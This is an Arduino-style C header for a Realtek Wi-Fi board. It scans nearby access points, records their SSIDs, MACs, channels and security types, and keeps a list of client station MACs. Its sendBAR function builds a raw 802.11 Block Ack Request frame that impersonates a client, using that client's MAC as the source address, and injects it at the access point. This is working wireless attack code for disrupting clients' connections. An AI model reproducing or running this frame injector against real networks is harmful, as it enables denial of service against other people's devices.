#pragma once
#include <Arduino.h>
#include "wifi_cust_tx.h"

uint8_t _networkCount;

//no i wont use vector again,this is messy af but works
char nwSSID[WL_NETWORKS_LIST_MAXNUM][WL_SSID_MAX_LENGTH];
char nwMAC[WL_NETWORKS_LIST_MAXNUM][18];
char nwSecurity[WL_NETWORKS_LIST_MAXNUM][25];
int32_t nwRSSI[WL_NETWORKS_LIST_MAXNUM];
uint32_t nwEnc[WL_NETWORKS_LIST_MAXNUM];
uint8_t nwChannel[WL_NETWORKS_LIST_MAXNUM];
uint8_t nwBSSID[WL_NETWORKS_LIST_MAXNUM][6];

uint8_t staMAC[25][6]; //25 sta max
size_t staMACCount;

#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#define MACSTR "%02X:%02X:%02X:%02X:%02X:%02X"

const char* get_security(rtw_security_t security) {
  switch (security) {
    case RTW_SECURITY_OPEN: return "Open";
    case RTW_SECURITY_WEP_PSK: return "WEP PSK";
    case RTW_SECURITY_WEP_SHARED: return "WEP Shared";
    case RTW_SECURITY_WPA_TKIP_PSK: return "WPA TKIP PSK";
    case RTW_SECURITY_WPA_AES_PSK: return "WPA AES PSK";
    case RTW_SECURITY_WPA_MIXED_PSK: return "WPA Mixed PSK";
    case RTW_SECURITY_WPA2_AES_PSK: return "WPA2 AES PSK";
    case RTW_SECURITY_WPA2_TKIP_PSK: return "WPA2 TKIP PSK";
    case RTW_SECURITY_WPA2_MIXED_PSK: return "WPA2 Mixed PSK";
    case RTW_SECURITY_WPA_WPA2_TKIP_PSK: return "WPA/WPA2 TKIP PSK";
    case RTW_SECURITY_WPA_WPA2_AES_PSK: return "WPA/WPA2 AES PSK";
    case RTW_SECURITY_WPA_WPA2_MIXED_PSK: return "WPA/WPA2 Mixed PSK";
    case RTW_SECURITY_WPA2_AES_CMAC: return "WPA2 AES CMAC";
    case RTW_SECURITY_WPA_TKIP_ENTERPRISE: return "WPA TKIP Enterprise";
    case RTW_SECURITY_WPA_AES_ENTERPRISE: return "WPA AES Enterprise";
    case RTW_SECURITY_WPA_MIXED_ENTERPRISE: return "WPA Mixed Enterprise";
    case RTW_SECURITY_WPA2_TKIP_ENTERPRISE: return "WPA2 TKIP Enterprise";
    case RTW_SECURITY_WPA2_AES_ENTERPRISE: return "WPA2 AES Enterprise";
    case RTW_SECURITY_WPA2_MIXED_ENTERPRISE: return "WPA2 Mixed Enterprise";
    case RTW_SECURITY_WPA_WPA2_TKIP_ENTERPRISE: return "WPA/WPA2 TKIP Enterprise";
    case RTW_SECURITY_WPA_WPA2_AES_ENTERPRISE: return "WPA/WPA2 AES Enterprise";
    case RTW_SECURITY_WPA_WPA2_MIXED_ENTERPRISE: return "WPA/WPA2 Mixed Enterprise";
    case RTW_SECURITY_WPS_OPEN: return "WPS Open";
    case RTW_SECURITY_WPS_SECURE: return "WPS Secure";
    case RTW_SECURITY_WPA3_AES_PSK: return "WPA3 AES PSK";
    case RTW_SECURITY_WPA2_WPA3_MIXED: return "WPA2/WPA3 Mixed";
    case RTW_SECURITY_UNKNOWN: return "Unknown";
    default: return "Unknown security type";
  }
}

rtw_result_t wifidrv_scan_result_handler(rtw_scan_handler_result_t *result) {
  rtw_scan_result_t *record;

  if (result->scan_complete != RTW_TRUE) {
    record = &result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    if (_networkCount < WL_NETWORKS_LIST_MAXNUM) {
      strcpy(nwSSID[_networkCount], (char*)(strcmp((char*)record->SSID.val, "") == 0 ? "<Hidden>" : (char*)record->SSID.val));
      nwRSSI[_networkCount] = record->signal_strength;
      strncpy(nwSecurity[_networkCount], get_security(record->security), sizeof(nwSecurity[_networkCount]));
      nwSecurity[_networkCount][sizeof(nwSecurity[_networkCount]) - 1] = '\0';
      nwEnc[_networkCount] = record->security;
      nwChannel[_networkCount] = record->channel;
      memcpy(nwBSSID[_networkCount], record->BSSID.octet, sizeof(record->BSSID.octet));
      sprintf(nwMAC[_networkCount], "%02X:%02X:%02X:%02X:%02X:%02X", record->BSSID.octet[0], record->BSSID.octet[1], record->BSSID.octet[2], record->BSSID.octet[3], record->BSSID.octet[4], record->BSSID.octet[5]);
      _networkCount++;
    }
  }
  return RTW_SUCCESS;
}

int8_t scanNetworks() {
  uint8_t attempts = 5;
  _networkCount = 0;
  if (wifi_scan_networks(wifidrv_scan_result_handler, NULL) != RTW_SUCCESS) return WL_FAILURE;
  do delay(3000);
  while ((_networkCount == 0) && (--attempts > 0));
  return _networkCount;
}

void scanAPs(){
  Serial.println("Scanning available networks...");
  int n = scanNetworks();
  if (n == 0) Serial.println("No networks found");
  else for (int i=0; i<n; i++) printf("%i|%-30s RSSI: %-3ld Band: %s Channel: %-3u MAC: %s Encryption: %s\n", i, nwSSID[i], nwRSSI[i], (nwChannel[i] < 14 ? "2.4GHz" : "  5GHz"), nwChannel[i], nwMAC[i], nwSecurity[i]);
  Serial.println("");
}

static const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static const uint8_t zeroMac[6] = {0};

bool macValid(const uint8_t *mac) {
	return memcmp(mac, zeroMac, 6) != 0 && memcmp(mac, broadcastMac, 6) != 0 && !(mac[0] & 0x01);
}

void sendBAR(uint8_t* ap_bssid, uint8_t* sta_bssid) {
  uint8_t frame[] = {
    0x09, 0x00, // Frame Control: Type/Subtype
    0x00, 0x00, // Duration
    MAC2STR(ap_bssid),        // Destination
    MAC2STR(sta_bssid),       // Source
    MAC2STR(ap_bssid),        // BSSID
    0x00, 0x00, // Sequence/Fragment number

    // Payload
    0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x7f, 0x92, 0x08, 0x80
  };

  printf("Sending BAR from STA "MACSTR" to AP "MACSTR"\n", MAC2STR(sta_bssid), MAC2STR(ap_bssid));
  wifi_tx_raw_frame(frame, sizeof(frame));
}